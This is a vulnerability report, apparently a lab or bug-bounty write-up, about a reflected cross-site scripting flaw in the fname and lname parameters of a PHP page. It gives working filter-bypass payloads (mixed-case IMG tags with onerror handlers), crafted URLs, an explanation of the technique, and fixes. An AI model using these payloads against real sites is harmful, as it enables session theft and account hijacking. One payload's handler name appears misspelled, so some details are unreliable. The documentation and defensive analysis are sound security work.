# Reflected Cross-Site Scripting (XSS) - Script & Img Tag Bypass

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.

The application accepts user-controlled input through the `fname` and `lname` GET parameters and reflects it back to the page without proper sanitization or output encoding. By injecting malicious HTML/JavaScript payloads, arbitrary code execution is achieved despite potential filtering of `<script>` and `<img>` tags.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering a `confirm(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameters

```text
fname
lname
```

## Vulnerable URL

```text
https://kzlabs.in/3.php?fname='>anil<IMG SrC=x ONeRRoR=confirm(1)>&lname='>anil<IMG SrC=x ONeRRo=confirm(2)>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the values of the `fname` and `lname` parameters with the following payloads:

   ```text
   fname='>anil<IMG SrC=x ONeRRoR=confirm(1)>
   lname='>anil<IMG SrC=x ONeRRo=confirm(2)>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/3.php?fname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E&lname=%27%3Eanil%3CIMG+SrC%3Dx+ONeRRo%3Dconfirm%282%29%3E
   ```

4. Observe that the browser executes the injected payload and displays `confirm(1)` and `confirm(2)` popups.

5. Note that the injected values are reflected in the input fields:
   - First Name field contains: `anil">`
   - Last Name field contains: `anil">`

## Payloads Used

```text
fname: '>anil<IMG SrC=x ONeRRoR=confirm(1)>
lname: '>anil<IMG SrC=x ONeRRo=confirm(2)>
```

URL-encoded versions:
```text
fname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E
lname: %27%3Eanil%3CIMG+SrC%3Dx+ONeRRo%3Dconfirm%282%29%3E
```

Alternative payloads observed:
```text
%27%22%3Eanil%3CIMG+SrC%3Dx+ONeRRoR%3Dconfirm%281%29%3E
```

## Proof of Concept

The application accepts the values of the `fname` and `lname` parameters and reflects them directly into the page HTML without proper sanitization. The payload successfully bypasses script and image tag filters.

The payload works by:
1. Breaking out of the existing HTML context using `'>` or `'">`
2. Injecting an `<IMG>` tag with the `ONeRRoR` event handler
3. The `ONeRRoR` event triggers when the image fails to load (due to `SrC=x`, where `x` is an invalid source)
4. This executes the JavaScript `confirm(1)` and `confirm(2)`

```html
<!-- Injected payload rendered in the page: -->
'><img src="x" onerror="confirm(1)">
'><img src="x" onerror="confirm(2)">
```

The payload is also reflected in the input field values as seen in the second screenshot, confirming the data flow from parameters to the page output.

<img width="1897" height="918" alt="Screenshot 2026-08-14 174158" src="https://github.com/user-attachments/assets/8fd6ef04-858a-4f9f-8452-dd2e5019a932" />


<img width="1919" height="912" alt="Screenshot 2026-08-14 174145" src="https://github.com/user-attachments/assets/9e76df1f-a2f7-443d-be0c-bb40e456abde" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user
- Bypass weak script and image tag filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($_GET['fname'], ENT_QUOTES, 'UTF-8');
  ```

- **Input Validation**: Validate and sanitize all user inputs. Consider using a whitelist approach to allow only safe characters.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and event handlers using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.). Different contexts require different escaping strategies.

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes while preserving safe content.

- **Avoid Direct Reflection**: Consider avoiding the direct reflection of user input in the response. Use server-side validation and sanitization before output.

---
